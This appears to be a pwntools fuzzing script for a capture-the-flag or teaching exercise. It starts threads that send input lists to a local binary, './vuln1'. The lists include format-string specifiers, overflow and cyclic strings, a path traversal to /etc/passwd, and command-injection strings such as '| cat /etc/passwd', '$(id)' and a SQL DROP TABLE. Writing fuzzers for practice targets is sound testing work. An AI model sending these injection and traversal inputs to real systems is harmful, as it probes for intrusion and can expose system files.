from pwn import *
import threading


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


exe = './vuln1'
elf = context.binary = ELF(exe, checksec=False)

# per domande booleane
boolean_payloads = [
    b"yes",
    b"no",
    b"y",
    b"n",
    b"1",
    b"2",
    b"3",
    b"A",
    b"B",
    b"C",
    b"true",
    b"false",
]

# roba da mandare ad ogni richiesta di input
payloads = [
    b"%x",
    b"%s",
    b"%n",
    b"%p",
    b"%x %x %x",
    b"%s %s %s",
    b"%n %n %n",
    b"%p %p %p",
    b"AAAA %x %x %x",
    b"BBBB %s %s %s",
    b"%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x%x %x %x %x %x%x %x %x %x %x",
    b"%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
]

boundary_payloads = [
    b"A" * 8,           # Small overflow
    b"A" * 16,          # Medium
    b"A" * 256,         # Large
    b"A" * 1024,        # Very large
    b"A" * 10000,       # Huge
    cyclic(100),        # Pattern ciclico (per trovare offset)
]

special_chars = [
    b"\x00",            # Null byte
    b"\n\r",            # Newlines
    b"\x0a\x0d",        # CR/LF
    b"'\"",             # Quotes
    b";|&`$",           # Shell metacharacters
    b"../../../etc/passwd",  # Path traversal
]

integer_payloads = [
    b"0",
    b"-1",
    b"2147483647",      # INT_MAX (32-bit)
    b"2147483648",      # INT_MAX + 1
    b"-2147483648",     # INT_MIN
    b"4294967295",      # UINT_MAX
    b"9999999999999",   # Very large number
]

command_injection = [
    b"; ls",
    b"| cat /etc/passwd",
    b"`whoami`",
    b"$(id)",
    b"'; DROP TABLE users--",  # SQL injection
]

unicode_payloads = [
    b"\xc0\x80",        # Overlong encoding
    b"\xff\xff\xff\xff", # Invalid UTF-8
    "💣🔥".encode(),    # Emoji
    "ＡＡＡＡ".encode(), # Fullwidth characters
]

redos_payloads = [
    b"a" * 1000 + b"X",  # Pattern che causa backtracking
    b"(" * 100,          # Unbalanced parentheses
]

all_payloads = [boolean_payloads, payloads, boundary_payloads, special_chars, integer_payloads, command_injection, unicode_payloads, redos_payloads]

total_payloads = len(boolean_payloads) + len(payloads) + len(boundary_payloads) + len(special_chars) +len(integer_payloads) + len(command_injection) + len(unicode_payloads) + len(redos_payloads)

lock = threading.Lock()
total = 0 #contatore per numero di payloads mandati

def receiver_sender(payloads, counter):
    global total
    try:
        io = process([exe])
        while True:
            prompt = io.recvrepeat(timeout=0.5)
            #print("received:")
            #print(prompt.decode(errors='ignore'))
            io.sendline(payloads[counter])
            print(f"sent: {payloads[counter].decode()}")
            with lock:
                total += 1
            #print("--------------------------------")
    except EOFError:
        #print(f"[!] Program exited after {counter} inputs")
        pass
    except Exception as e:
        #print(f"[!] Unexpected error: {e}")
        pass
    finally:
        #print("closing process")
        
        io.close()
    counter += 1
    

def fuzz(payloads):
    threads = []
    number_of_payloads = len(payloads)
    print(f"number of payloads/process to start: {number_of_payloads}")
    for counter in range(len(payloads)):
        thread = threading.Thread(target=receiver_sender, args=(payloads, counter))
        thread.start()
        threads.append(thread)
    return threads


all_threads = []
for payloads in all_payloads:
    print(f"starting thread set for {payloads}")
    threads = fuzz(payloads)
    all_threads.extend(threads)

for t in all_threads:
    t.join()

print(f"total: {total}")
print(f"total payloads: {total_payloads}")